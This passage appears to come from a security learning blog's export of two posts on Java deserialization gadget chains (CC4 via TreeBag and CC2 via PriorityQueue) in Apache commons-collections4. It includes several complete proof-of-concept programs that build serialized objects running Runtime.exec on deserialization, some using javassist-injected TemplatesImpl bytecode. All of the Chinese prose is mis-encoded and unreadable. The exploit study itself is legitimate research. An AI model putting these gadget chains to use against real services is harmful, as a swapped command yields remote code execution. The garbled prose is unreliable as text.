ç›´æ¥è¿”å›äº†æˆ‘ä»¬å®šä¹‰çš„comparatorã€‚æ‰€ä»¥åºåˆ—åŒ–çš„æ—¶å€™ä¼šåºåˆ—åŒ–æˆ‘ä»¬å®šä¹‰çš„comparatorï¼š\nâ€”â€”\né‚£ä¹ˆçœ‹ååºåˆ—åŒ–ï¼š æ‰€ä»¥è¿™é‡Œåˆå°†è¿™ä¸ªcomparatorååºåˆ—åŒ–äº†å‡ºæ¥ã€‚\né‚£ä¹ˆè¿™æ ·è¿‡åå°±å¯ä»¥è§£å†³transienté—®é¢˜ã€‚\nç¬¬äºŒä¸ª 2.ä¹Ÿå°±æ˜¯forå¾ªç¯ä¸èƒ½è¿›å»çš„é—®é¢˜ï¼š æƒ³è¦è¿›å…¥forå¾ªç¯ï¼Œè¿™é‡Œä¸entrySize()æœ‰å…³ï¼Œè€ŒentrySizeçš„å€¼åˆä¸in.readInt()æœ‰å…³ã€‚\næ­¤æ—¶åŒæ ·éœ€è¦çœ‹TreeBagçš„writeObject()æ–¹æ³•ï¼Œå‰é¢è¿˜æ²¡æœ‰åˆ†æå®Œï¼š\nè¿™é‡Œåœ¨åºåˆ—åŒ–çš„æ—¶å€™åŒæ ·è¦è¿›å…¥çˆ¶ç±»ä¸€æ¬¡ï¼ŒAbstractMapBagçš„doWriteObject()æ–¹æ³•å¦‚ä¸‹ï¼š ä¸€çœ¼å‡ºæ¥ï¼Œå°±æ˜¯å’Œè¿™é‡Œçš„writeInt()æœ‰å…³ï¼Œè€ŒwriteInt()åˆä¸TreeMapçš„size()å‡½æ•°æœ‰å…³ï¼š æ­¤æ—¶æƒ³åˆ°äº†å‰é¢cc2å¯¹è¿™ä¸ªsizeçš„æè¿°ï¼Œç›´æ¥çŒœä¸€æ³¢å’Œadd()ç›¸å¹²ï¼ŒTreeMapæœ‰addæ–¹æ³•ï¼Œä½†æ˜¯è¿˜æ˜¯ç›¸å½“äºç›´æ¥è°ƒç”¨çš„çˆ¶ç±»AbstractMapBagçš„add()æ–¹æ³•ï¼š é‡Œé¢ä¼šè°ƒç”¨TreeMapçš„get()æ–¹æ³•ï¼š è¿™é‡Œä¹Ÿå°±æ˜¯çœ‹æ˜¯å¦æœ‰å€¼ï¼Œå¾ˆæ˜¾ç„¶æˆ‘ä»¬å¹¶æ²¡æœ‰å¾€é‡Œé¢ä¼ è¿‡å€¼ï¼Œé‚£ä¹ˆmutå°±ä¸ºnullï¼Œè¿™æ ·å°±è¿›å…¥TreeMapç±»çš„put()æ–¹æ³•ï¼š\nå†çœ‹putæ–¹æ³•æºç ï¼š è¿™é‡Œå¾ˆè‡ªç„¶å°±ä¼šä½¿å¾—sizeä¸º1ã€‚\nâ€”â€”â€”â€”â€”â€”\nä½†æ˜¯è¿™é‡Œéœ€è¦æ³¨æ„ä¼šè°ƒç”¨compare()æ–¹æ³•ï¼Œå‰é¢ä¹Ÿè¯´è¿‡è¿™ä¸ªæ–¹æ³•äº†ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®å‡çš„è¯åº”è¯¥ä¼šå¯¼è‡´å¼¹ä¸¤ä¸ªè®¡ç®—æœºï¼Œæµ‹è¯•ä¸€ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package org.example; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.bag.TreeBag; public class Main{ public static void main(String[] args) throws Exception { Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(chainPart); TransformingComparator comparator1 = new TransformingComparator(chain); TreeBag treeBag = new TreeBag(comparator1); treeBag.add(\u0026#34;fupanc\u0026#34;,1); } } æˆåŠŸæŒ‰ç…§é¢„æœŸå¼¹äº†ä¸¤ä¸ªè®¡ç®—æœºã€‚æƒ³æ³•æˆç«‹ã€‚\nä½†æ˜¯åœ¨å‰é¢åŸºæœ¬æµç¨‹è®²è§£çš„è¿‡ç¨‹ä¸­ï¼Œé—ç•™äº†ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ï¼Œç›®çš„åŒæ ·æ˜¯è°ƒç”¨è¿™ä¸ªput()æ–¹æ³•ï¼š æ‰€ä»¥è¯´ä¼šè¿›å…¥TreeMapç±»çš„put()æ–¹æ³•ï¼š\né‡ç‚¹å…¶å®ä¹Ÿæ ‡æ³¨å‡ºæ¥äº†ï¼Œä¸»ä¹‰çœ‹å‰é¢åºåˆ—åŒ–ä¹‹å‰ä¼šè°ƒç”¨è¿™ä¸ªput()æ–¹æ³•ï¼Œåœ¨è¿™ä¸ªput()æ–¹æ³•ä¸­å°†rootå˜é‡èµ‹å€¼äº†ï¼Œè¿™å°±è®©rootä¸å†æ˜¯ä¸€ä¸ªç©ºå€¼ï¼Œé‚£ä¹ˆåœ¨ååºåˆ—åŒ–æ—¶ä¸ºä»€ä¹ˆå¯ä»¥è¿›å…¥å‘¢ï¼Œå…¶å®è¿˜æ˜¯å› ä¸ºrootè¢«transientå…³é”®å­—ä¿®é¥°äº†ï¼Œå¯¼è‡´ä¸èƒ½è¢«åºåˆ—åŒ–ï¼Œæ•…è€Œåœ¨ååºåˆ—åŒ–æ—¶ä¹Ÿå¯ä»¥è¿›å…¥è¿™ä¸ªifæ¡ä»¶ï¼Œä»è€ŒæˆåŠŸè°ƒç”¨compare()æ–¹æ³•ã€‚\nâ€”â€”â€”â€”â€”â€”\nOKï¼Œé‚£ä¹ˆå°±é€šäº†ï¼Œåªè¦è¿™é‡Œsizeä¸º1å°±å¯ä»¥æˆåŠŸä½¿å¾—this.map.size()è¿”å›1ï¼Œè¿™æ ·åºåˆ—åŒ–çš„æ—¶å€™å°±å¯ä»¥åºåˆ—åŒ–1äº†ï¼Œååºåˆ—åŒ–è¯»å–çš„æ—¶å€™ä¹Ÿä¸æ˜¯0äº†ï¼Œä»è€ŒæˆåŠŸå¯ä»¥è¿›å…¥forå¾ªç¯ã€‚\næ¡ä»¶åŸºæœ¬éƒ½è¯´æ˜äº†ï¼Œç›´æ¥ä¸Šä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 package org.example; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import java.lang.reflect.Field; import org.apache.commons.collections4.bag.TreeBag; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); TransformingComparator comparator1 = new TransformingComparator(chain); TreeBag treeBag = new TreeBag(comparator1); treeBag.add(\u0026#34;fupanc\u0026#34;,1); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(treeBag); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } æˆåŠŸå¼¹å‡ºé¢„æœŸçš„ä¸¤ä¸ªè®¡ç®—æœº\njavassistè¡¥å…… é‚£ä¹ˆåŒæ ·çš„åˆ©ç”¨javassistä¹Ÿæ˜¯å¯è¡Œçš„ï¼Œå°±æ˜¯æ³¨æ„ä¸€ä¸‹å‰é¢è¯´çš„éœ€è¦å…³æ³¨compareçš„å€¼ï¼š å‰é¢çš„ç†è®ºè¿‡ç¨‹æ‡‚äº†çš„è¯å°±åŸºæœ¬æ²¡æœ‰é—®é¢˜äº†ï¼Œå°±æ˜¯ä¸‹é¢çš„keyéœ€è¦ä¸ºTemplatesImplç±»å®ä¾‹ï¼š è¿™é‡ŒåŒæ ·éœ€è¦æ³¨æ„add()æ—¶å¼¹å‡ºè®¡ç®—æœºçš„é—®é¢˜ï¼Œç›´æ¥åœ¨ä¸‹é¢çš„POCä¸€å¹¶è§£å†³äº†\nå¯ä»¥æ„é€ å¦‚ä¸‹POCï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 package org.example; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.bag.TreeBag; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\u0026#34;org.apache.commons.collections4.functors.InvokerTransformer\u0026#34;).getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\u0026#34;newTransformer\u0026#34;); TransformingComparator comparator1 = new TransformingComparator(transformer); TreeBag treeBag = new TreeBag(comparator1); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\u0026#34;Cat\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc.exe\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \u0026#34;EvilCat\u0026#34; + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); treeBag.add(templates,1); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); outputStream.writeObject(treeBag); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); inputStream.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } å¼¹å‡ºä¸¤ä¸ªè®¡ç®—æœºï¼Œè¿˜æ˜¯ç®—é¢„æœŸçš„ï¼Œaddä¸€æ¬¡ï¼Œååºåˆ—åŒ–ä¸€æ¬¡ï¼Œå’ŒCC2é‚£é‡Œæ˜¯æœ‰åŒºåˆ«çš„ï¼Œè°ƒè¯•äº†ä¸€ä¸‹å¥½åƒæ˜¯åœ¨ç¬¬ä¸€æ¬¡æˆåŠŸè°ƒç”¨transformåæŠ›å‡ºå¼‚å¸¸ï¼Œå¯¼è‡´ä¸èƒ½è°ƒç”¨åˆ°ç¬¬äºŒä¸ªtransformã€‚\nä½†æ˜¯è¿™é‡ŒåŒæ ·éœ€è¦æ³¨æ„addæ—¶ä¼šè°ƒç”¨ä¸€æ¬¡ï¼Œä¼šå…ˆå¼¹ä¸€æ¬¡è®¡ç®—æœºï¼Œæ‰€ä»¥è¿˜æ˜¯å…ˆå‡å†åå°„æ›´æ”¹æ¥é˜²æ­¢åºåˆ—åŒ–å‰å¼¹ã€‚\næ‰€ä»¥æœ€ç»ˆPOCä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 package org.example; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.bag.TreeBag; import java.lang.reflect.Field; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ ConstantTransformer fakeTransformer = new ConstantTransformer(1); Constructor constructor = Class.forName(\u0026#34;org.apache.commons.collections4.functors.InvokerTransformer\u0026#34;).getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\u0026#34;newTransformer\u0026#34;); TransformingComparator comparator1 = new TransformingComparator(fakeTransformer); TreeBag treeBag = new TreeBag(comparator1); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\u0026#34;Cat\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc.exe\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \u0026#34;EvilCat\u0026#34; + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); treeBag.add(templates,1); Field field1 = TransformingComparator.class.getDeclaredField(\u0026#34;transformer\u0026#34;); field1.setAccessible(true); field1.set(comparator1,transformer); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); outputStream.writeObject(treeBag); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); inputStream.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } æˆåŠŸå¼¹å‡ºé¢„æœŸçš„ä¸€ä¸ªè®¡ç®—æœºï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥è¿™é‡Œèƒ½ç›´æ¥åå°„ä¿®æ”¹finalä¿®é¥°çš„transformerï¼Œæ­£å¸¸åº”è¯¥æ˜¯ï¼š\n1 2 3 4 5 6 7 8 import java.lang.reflect.Modifier; Field field1 = TransformingComparator.class.getDeclaredField(\u0026#34;transformer\u0026#34;); field1.setAccessible(true); Field modifiersField = Field.class.getDeclaredField(\u0026#34;modifiers\u0026#34;); modifiersField.setAccessible(true); modifiersField.setInt(field1, field1.getModifiers() \u0026amp; ~Modifier.FINAL); field1.set(comparator1,transformer); OKï¼Œé“¾å­å®Œç»“äº†ã€‚\n","date":"2024-07-27T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/cc4/","title":"CC4"},{"content":"CC2 common-collection4 å®˜æ–¹è®¤ä¸ºæ—§çš„æ—§çš„common-collectionæœ‰ä¸€äº›ç»“æ„å’ŒAPIè®¾è®¡ä¸Šçš„é—®é¢˜ï¼Œä½†ä¿®å¤è¿™äº›é—®é¢˜ä¼šäº§ç”Ÿå¤§é‡ä¸èƒ½å‘å‰å…¼å®¹çš„æ”¹åŠ¨ã€‚äºæ˜¯æ¨å‡ºçš„common-collection4ä¸å†è®¤ä¸ºæ˜¯ä¸€ä¸ªç”¨æ¥æ›¿æ¢common-collectionçš„æ–°ç‰ˆæœ¬ï¼Œè€Œæ˜¯ä¸€ä¸ªæ–°çš„åŒ…ã€‚\nä¸¤è€…çš„å‘½åç©ºé—´ä¸å†²çªï¼Œå¯ä»¥å…±å­˜åœ¨åŒä¸€ä¸ªé¡¹ç›®ä¸­ã€‚\nåœ¨common-collection4-4.0ä¸‹ï¼Œä¾æ—§èƒ½åˆ©ç”¨common-collection-3.2.1çš„è°ƒç”¨é“¾ï¼Œåªæ˜¯æ¢äº†ä¸ªåŒ…åè€Œå·²ã€‚\nä¾èµ–æ”¹æˆå¦‚ä¸‹å³å¯ï¼š\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.commons\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections4\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; ç®€å•è¯´ç‚¹åŒºåˆ«å§ï¼Œæ¯”å¦‚\nLazyMapçš„decorateï¼š 3.2.1\n4.0\næ€»ç»“ï¼šä¸€å®šè¦æ³¨æ„åŒ…çš„é—®é¢˜ï¼Œè¿˜æ˜¯æœ‰ä¸ä¸€æ ·çš„\né’ˆå¯¹common-collections4ï¼Œysoserialä¹Ÿæ˜¯ç»™å‡ºäº†ä¸¤æ¡ååºåˆ—åŒ–è°ƒç”¨é“¾ï¼Œä¹Ÿå°±æ˜¯cc2å’Œcc4ï¼Œè¿™é‡Œå°±è®²è®²CC2ã€‚\nå‰ç½®çŸ¥è¯† æµ‹è¯•ç¯å¢ƒï¼š commons-collections4.0 JDK 8u411 CC2æœ‰åˆ©ç”¨åˆ°javassistï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦æœ‰javassistçš„å‰ç½®çŸ¥è¯†ã€‚\néœ€è¦äº†è§£çš„ç±» PriorityQueue è¿™ä¸ªç±»ä½äºjava.util.PriorityQueue\nPriorityQueue ä¼˜å…ˆçº§é˜Ÿåˆ—æ˜¯åŸºäºä¼˜å…ˆçº§å †ï¼ˆa priority heapï¼‰çš„ä¸€ç§ç‰¹æ®Šé˜Ÿåˆ—ï¼Œä»–ç»™æ¯ä¸ªå…ƒç´ å®šä¹‰â€œä¼˜å…ˆçº§â€ï¼Œè¿™æ ·å–å‡ºæ•°æ®çš„æ—¶å€™ä¼šæŒ‰ç…§ä¼˜å…ˆçº§æ¥å–ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼˜å…ˆçº§é˜Ÿåˆ—ä¼šæ ¹æ®è‡ªç„¶é¡ºåºå¯¹å…ƒç´ è¿›è¡Œæ’åºã€‚\nå› æ­¤ï¼Œæ”¾å…¥PriorityQueueçš„å…ƒç´ ï¼Œå¿…é¡»å®ç° Comparable æ¥å£ï¼ŒPriorityQueue ä¼šæ›´å…·å…ƒç´ çš„æ’åºé¡ºåºå†³å®šå‡ºå †çš„ä¼˜å…ˆçº§ã€‚å¦‚æœæ²¡æœ‰å®ç° Comparable æ¥å£ï¼ŒPriorityQueue è¿˜å…è®¸æˆ‘ä»¬æä¾›ä¸€ä¸ª Comparator å¯¹è±¡æ¥åˆ¤æ–­ä¸¤ä¸ªå…ƒç´ çš„é¡ºåºã€‚\nåœ¨CC2ä¸­ï¼Œæˆ‘ä»¬å°±æ˜¯è¦åˆ©ç”¨åˆ°PriorityQueueç±»ï¼Œæ¥çœ‹è¿™ä¸ªç±»é‡å†™çš„readObject()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); s.readInt(); SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size); queue = new Object[size]; for (int i = 0; i \u0026lt; size; i++) queue[i] = s.readObject(); heapify(); } è¿™é‡Œå°†æ•°æ®ååºåˆ—åŒ–åˆ°queueä¸­åï¼Œä¼šè°ƒç”¨heapify()æ–¹æ³•æ¥å¯¹æ•°æ®è¿›è¡Œæ’åºã€‚è·Ÿè¿›ä¸€ä¸‹heapify()æ–¹æ³•ï¼š heapify()æ–¹æ³•ä¼šè°ƒç”¨siftDown()ï¼Œç»§ç»­è·Ÿè¿›ï¼š\nå½“comparatorä¸ä¸º null çš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨siftDownUsingComparator()æ–¹æ³•ï¼š\nåœ¨ siftDownUsingComparator() æ–¹æ³•ä¸­ï¼Œä¼šè°ƒç”¨ comparator çš„ compare() æ–¹æ³•æ¥è¿›è¡Œä¼˜å…ˆçº§çš„æ¯”è¾ƒå’Œæ’åºã€‚\nè¿™æ ·ï¼Œååºåˆ—åŒ–ä¹‹åçš„ä¼˜å…ˆçº§é˜Ÿåˆ—ï¼Œä¹Ÿæ‹¥æœ‰äº†é¡ºåºã€‚\nTransformingComparator TransformingComparator æ˜¯è§¦å‘æ¼æ´çš„å…³é”®ï¼Œä»–å°† Transformer æ‰§è¡Œç‚¹å’Œ PriorityQueue è§¦å‘ç‚¹è”ç³»äº†èµ·æ¥ã€‚è¿™ä¸ªç±»ä½äºorg.apache.commons.collections4.comparators.TransformingComparatorã€‚\næ—¢ç„¶è¿™é‡Œéƒ½è¯´åˆ°äº†è”ç³»äº†èµ·æ¥ï¼Œåœ¨PriorityQueue ç±»çš„æœ€åè¯´åˆ°äº† compare() æ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹TransformingComparator çš„compare()æ–¹æ³•ï¼š è¿™é‡Œå°±è°ƒç”¨åˆ°äº†transform æ–¹æ³•ï¼Œé€šè¿‡çš„æ˜¯this.transformerå¯¹è±¡ï¼Œæ¥çœ‹ä¸€ä¸‹TransformingComparatorçš„æ„é€ æ–¹æ³•ï¼š å¦‚æœåˆå§‹åŒ–çš„æ—¶å€™ä¸æŒ‡å®š Comparatorï¼Œåˆ™ä½¿ç”¨è¿™ä¸ªç±»ç›´æ¥å®šä¹‰çš„çš„ ComparableComparator.comparableComparator()ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªæ„é€ æ–¹æ³•ï¼Œå¹¶ä¸”æˆ‘ä»¬å°±æ˜¯è¦åˆ©ç”¨ç¬¬ä¸€ä¸ªæ„é€ æ–¹æ³•ã€‚\nè¿™é‡Œå¯ä»¥çœ‹åˆ°æ­£å¥½è¿™ä¸ªthis.transformerå˜é‡æ˜¯æˆ‘ä»¬è¦æ±‚çš„Transformerç±»å‹ã€‚è¿™æ ·æˆ‘ä»¬å°±ä¼ å…¥åŸºæœ¬ç›˜çš„é“¾å­å®ç°æ¼æ´åˆ©ç”¨ã€‚\né“¾å­å¤§æ¦‚å‡ºæ¥äº†ï¼Œç°åœ¨å°±æ˜¯æ¥æ„é€ ã€‚\næ”»å‡»æ„é€  è¿˜æ˜¯ç»™ä¸ªä»£ç æ¥è°ƒè¯•ï¼Œç»“åˆå‰é¢çš„å¤§æ¦‚é“¾å­çš„è¯´æ˜ï¼Œè¿™é‡Œéœ€è¦ç»™å‡ºPriorityQueueå®ä¾‹å’ŒTransformingComparatorå®ä¾‹ï¼Œè¿˜æ˜¯ç®€å•ç»™å‡ºä¸€ä¸ªä»£ç æ¥è°ƒè¯•ã€‚æ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬è¦åˆ©ç”¨åˆ°çš„PriorityQueueç±»çš„æ„é€ æ–¹æ³•ï¼š è¿™é‡Œçš„initialCapacityä¸èƒ½å°äº1ã€‚\nç»“åˆå‰é¢çš„æè¿°ï¼Œæˆ‘ä»¬éœ€è¦å°†è¿™é‡Œçš„this.comparatorè®¾ç½®ä¸ºTransformingComparatorç±»çš„å®ä¾‹ã€‚\né‚£ä¹ˆå°±å¯ä»¥å°è¯•æ„é€ ä¸€ä¸‹ä»£ç äº†ï¼š\nfake:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package org.example; import java.util.PriorityQueue; import java.util.Comparator; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(chainPart); TransformingComparator comparator1 = new TransformingComparator(chain); PriorityQueue priority = new PriorityQueue(1,comparator1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œç›´æ¥åœ¨heapify()å°±ç»“æŸäº†ï¼Œå¹¶æ²¡æœ‰è¿›å…¥forå¾ªç¯ï¼š ä¸ªäººæƒ³æ³•ï¼šè¿™æ˜¯å› ä¸ºPriorityQueueè¢«åˆå§‹åŒ–çš„æ—¶å€™åªæœ‰ä¸€ä¸ªå…ƒç´ ç©ºé—´ï¼Œä½†æ˜¯æ²¡æœ‰å®é™…æ·»åŠ ä»»ä½•å…ƒç´ ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è°ƒç”¨PriorityQueueçš„addæ–¹æ³•æ¥å‘å¯¹è±¡æ·»åŠ å…ƒç´ \nç–‘é—®ä¸€ è¿™é‡Œå°±æœ‰ä¸ªå°ç–‘é—®äº†ï¼Œåˆå§‹åŒ–äº†ä¸€ä¸ªå…ƒç´ ç©ºé—´ï¼Œè¿™æ˜¯ä»€ä¹ˆï¼Œæˆ‘ä»¬çœ‹ä¹‹å‰ç»™å‡ºçš„åˆ©ç”¨åˆ°çš„PriorityQueueç±»çš„æ„é€ æ–¹æ³•ï¼š å¹¶ä¸”æˆ‘ä»¬åœ¨åˆå§‹åŒ–çš„æ—¶å€™ç¡®å®æ˜¯åªä¼ äº†ä¸€ä¸ª1è¿›å»ã€‚ç°åœ¨æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªæ„é€ æ–¹æ³•ï¼Œæˆ‘ä»¬çœ‹è¿™ä¸€å—ï¼š è¿™é‡Œæ˜¯åˆ›å»ºäº†ä¸€ä¸ªä¸‹æ ‡ä¸ºinitialCapacityçš„Objectæ•°ç»„å¹¶èµ‹å€¼ç»™äº†this.queueï¼Œæ‰€ä»¥åœ¨è¿™é‡ŒinitialCapacityçš„å€¼ä»£è¡¨äº†è¿™ä¸ªæ•°ç»„èƒ½å®¹çº³å¤šå°‘ä¸ªå€¼ã€‚\né‚£ä¹ˆç°åœ¨æ¥çœ‹ä¸€ä¸‹addæ–¹æ³•ï¼š è¿™ä¸ªaddæ–¹æ³•å®é™…è°ƒç”¨çš„æ˜¯offer()æ–¹æ³•ï¼Œæ¥åˆ†æä¸€ä¸‹offer()æ–¹æ³•çš„æºç ï¼š\nè¿™é‡Œç”¨åˆ°äº†sizeå˜é‡ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š 